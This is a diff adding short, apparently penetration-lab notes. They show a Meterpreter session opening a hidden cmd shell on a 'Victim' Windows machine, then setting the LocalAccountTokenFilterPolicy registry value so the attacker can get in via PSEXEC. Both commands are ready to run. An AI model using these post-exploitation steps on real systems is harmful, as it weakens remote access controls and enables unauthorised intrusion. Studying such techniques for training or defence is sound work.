@@ -1,0 +1,9 @@
+- We use the shell command to get to the Victim Dos command so we can add a registry field.
+ 
+meterpreter > execute -c -H -f cmd -a "/k" -i
+reg /?
+ 
+ 
+- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
+ 
+C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1
